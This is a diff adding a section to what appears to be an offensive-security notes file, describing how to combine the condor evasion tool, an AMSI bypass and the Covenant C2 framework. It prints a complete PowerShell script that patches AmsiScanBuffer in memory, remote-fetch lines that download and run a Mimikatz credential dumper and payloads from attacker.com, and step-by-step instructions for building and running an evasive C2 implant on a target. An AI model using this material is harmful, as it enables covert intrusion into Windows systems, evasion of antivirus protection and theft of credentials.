@@ -32,3 +32,102 @@ Command:
 iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
 ```
 
+# Using condor tool + AMSI bypass + Covenant C2
+
+The condor tool is used for evasion of protection like AVs/EDRs/XDRs. You can use it to combo an AMSI bypass and a C2 like Covenant.
+
+1. On the attacker's machine, create a folder where there will be two powershell scripts, one to bypass AMSI and another for the target to connect with C2.
+
+bypass.ps1
+
+```
+# TLDR:
+# iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
+#
+# @author Pichaya Morimoto (p.morimoto@sth.sh)
+# One Shot for M1m1katz PowerShell Dump All Creds with AMSI Bypass 2022 Edition
+# (Tested and worked on Windows 10 x64 patched 2022-03-26)
+#
+# Usage:
+# 1. You need a local admin user's powershell with Medium Mandatory Level (whoami /all)
+# 2. iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
+# or
+# iex(wget https://attacker-local-ip/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
+#
+# AMSI Bypass is copied from payatu's AMSI-Bypass (23-August-2021)
+# https://payatu.com/blog/arun.nair/amsi-bypass
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+public class WinApi {
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
+
+}
+"@
+
+Add-Type $code
+
+$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
+$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
+$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
+$out = 0
+
+[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
+[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
+[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)
+
+
+# nishang - 2.2.0 (Jul 24, 2021)
+# Change this to "attacker-local-ip" for internal sources
+
+iex(wget http://attacker.com/exec.ps1 -UseBasicParsing)
+```
+[Reference](https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093)
+
+On the last line where there is the ```wget``` command, put the IP of the attacker's machine where it will contain the two files (bypass.ps1 and exec.ps1)
+
+2. Go to Covenant and generate a powershell payload
+
+![](Images/genpscovenant1.png)
+
+![](Images/genpscovenant2.png)
+
+The payload will look like this:
+
+```
+sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7Vp7cFzle...
+```
+
+3. Now create a file called exec.ps1 and paste the modified payload
+
+4. Open an HTTP port so the target can connect to it and run bypass.ps1
+
+![](Images/httpopencovenant.png)
+
+5. Run the following command using the condor tool:
+
+```
+python3 condor.py -p windows/x64/exec
+```
+
+6. Paste the following command:
+
+```
+powershell -Sta -Nop -Window Hidden -Command "iex(wget http://attacker.com/bypass.ps1 -UseBasicParsing)"
+```
+
+Substitute "attacker.com" for the ip of the attacker's machine.
+
+7. After generating the EXE, run it on the target machine.
+
+![](Images/covenantpoc1.png)
+
+![](Images/covenantpoc2.png)
